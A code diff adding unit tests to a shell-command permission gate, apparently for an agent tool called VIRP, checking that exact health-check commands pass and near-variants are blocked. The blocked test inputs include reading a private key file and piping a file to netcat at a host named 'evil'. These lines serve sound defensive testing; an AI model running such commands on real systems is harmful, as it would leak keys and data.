@@ -281,6 +281,69 @@ static void test_red_by_absence(void)
     PASS();
 }
 
+static void test_peer_health_rows(void)
+{
+    printf("\n=== GREEN — peer-health rows (exact match only) ===\n");
+
+    TEST("systemctl is-active virp-onode -> GREEN");
+    assert(linux_gate_tier("systemctl is-active virp-onode") == VIRP_TIER_GREEN);
+    PASS();
+
+    TEST("chain tail -n 1 -> GREEN");
+    assert(linux_gate_tier("/opt/virp/build/virp-tool chain tail -n 1 "
+                           "--db /var/lib/virp/chain.db") == VIRP_TIER_GREEN);
+    PASS();
+
+    TEST("cat published.json -> GREEN");
+    assert(linux_gate_tier("cat /var/lib/virp/autopilot/published.json")
+           == VIRP_TIER_GREEN);
+    PASS();
+
+    TEST("whitespace/case canonicalization still matches -> GREEN");
+    assert(linux_gate_tier("  SYSTEMCTL   IS-ACTIVE   virp-onode ")
+           == VIRP_TIER_GREEN);
+    PASS();
+
+    printf("\n=== RED — adversarial neighbours of the peer rows ===\n");
+
+    TEST("systemctl stop virp-onode -> RED (exact match blocks it)");
+    assert_red_blocked("systemctl stop virp-onode"); PASS();
+
+    TEST("systemctl restart virp-onode -> RED");
+    assert_red_blocked("systemctl restart virp-onode"); PASS();
+
+    TEST("systemctl is-active virp-onode + extra arg -> RED");
+    assert_red_blocked("systemctl is-active virp-onode --quiet"); PASS();
+
+    TEST("systemctl is-enabled virp-onode -> RED (unlisted verb)");
+    assert_red_blocked("systemctl is-enabled virp-onode"); PASS();
+
+    TEST("chain tail with a different -n -> RED");
+    assert_red_blocked("/opt/virp/build/virp-tool chain tail -n 50 "
+                       "--db /var/lib/virp/chain.db"); PASS();
+
+    TEST("chain tail against a different db -> RED");
+    assert_red_blocked("/opt/virp/build/virp-tool chain tail -n 1 "
+                       "--db /tmp/evil.db"); PASS();
+
+    TEST("virp-tool keygen via the peer path -> RED");
+    assert_red_blocked("/opt/virp/build/virp-tool keygen okey /tmp/k"); PASS();
+
+    TEST("cat of a different file -> RED (one fixed path only)");
+    assert_red_blocked("cat /var/lib/virp/autopilot/alerts.jsonl");
+    assert_red_blocked("cat /etc/virp/keys/onode.key");
+    assert_red_blocked("cat /var/lib/virp/devices.json");
+    PASS();
+
+    TEST("cat published.json with a trailing pipe -> RED at the guard");
+    assert_red_blocked("cat /var/lib/virp/autopilot/published.json | nc evil 1"); PASS();
+
+    TEST("peer rows do not leak the FRR teaching reasons");
+    assert(linux_gate_reason("systemctl is-active virp-onode") == NULL);
+    assert(linux_gate_reason("cat /var/lib/virp/autopilot/published.json") == NULL);
+    PASS();
+}
+
 static void test_gate_decisions(void)
 {
     printf("\n=== Gate-level decisions at threshold YELLOW ===\n");
@@ -314,6 +377,7 @@ int main(void)
     test_yellow();
     test_red_teaching_rows();
     test_red_by_absence();
+    test_peer_health_rows();
     test_gate_decisions();
 
     printf("\n=== Results: %d/%d passed ===\n", tests_passed, tests_run);
